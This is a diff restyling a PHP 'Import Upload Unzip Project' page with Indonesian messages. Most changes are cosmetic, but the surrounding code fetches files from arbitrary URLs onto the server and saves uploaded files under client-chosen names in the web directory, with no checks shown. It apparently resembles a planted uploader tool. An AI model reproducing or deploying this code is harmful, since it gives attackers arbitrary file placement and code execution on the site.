@@ -12,7 +12,7 @@
   <title>Import Upload Unzip Project</title>
   <!-- Bootstrap CSS -->
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css" />
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.0/css/all.css" />
   <!-- Favicon -->
   <link rel="shortcut icon" href="https://github.githubassets.com/favicon.ico" type="img/x-icon"/>
   <link rel="icon" href="https://github.githubassets.com/favicon.ico" type="image/x-icon"/>
@@ -55,13 +55,13 @@ else{$file=$nama;}
 // File berhasil di import.
 if(copy($url,$file))
 {echo '<div class="alert alert-success text-center" role="alert"><i class="fal fa-check-circle"></i> File berhasil diimport dan disimpan sebagai “<u><a title="Visit Link" href="./'.$file;
-{echo '"><b><i class="fas fa-external-link"></i> '.$file;
+{echo '"><b><i class="far fa-external-link-square"></i> '.$file;
 {echo '</b></a></u>”</div>';}}}
 // File gagal di import.
 else {echo '<div class="alert alert-danger text-center" role="alert"><i class="far fa-exclamation-circle"></i> Gagal mengimport file <b>'.basename($url).'';} echo '</b></div>';}
 echo '<section id="import" class="import mb-4">
 <div class="container">
-<div class="row mb-4 pt-2">
+<div class="row mb-3 pt-2">
 <div class="col text-center">
 <h2>Import File Menu</h2>
 </div>
@@ -85,12 +85,26 @@ echo '<div class="row justify-content-center">
 ?>
 <hr/>
 <?php
-echo '<h1 align="center"><<- Upload File ->></h1>';
-echo '<center><form method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="60"><input name="_upl" type="submit" id="_upl" value="Upload File" class="submit"></form></center>';
+echo '<section id="upload" class="upload mb-4">
+<div class="container">
+<div class="row mb-3 pt-2">
+<div class="col text-center">
+<h2>Upload File Menu</h2>
+</div>
+</div>';
+echo '<div class="row justify-content-center">
+<div class="col-lg-8">
+<form method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="60"><input name="_upl" type="submit" id="_upl" value="Upload File" class="submit">
+</form>
+</div>
+</div>
+</div>
+</div>
+</section>';
 if( $_POST['_upl'] == "Upload File" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<center>Status: <font color="#009900">File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</font></center><br/><br/>'; }
-else { echo '<center>Status: <font color="#FF0000">File gagal diupload...!!!</font></center><br/><br/>'; }
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert">Status: File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/><br/>'; }
+else { echo '<div class="alert alert-danger text-center" role="alert">Status: File gagal diupload...!!!</div><br/><br/>'; }
 }
 ?>
 <hr/>
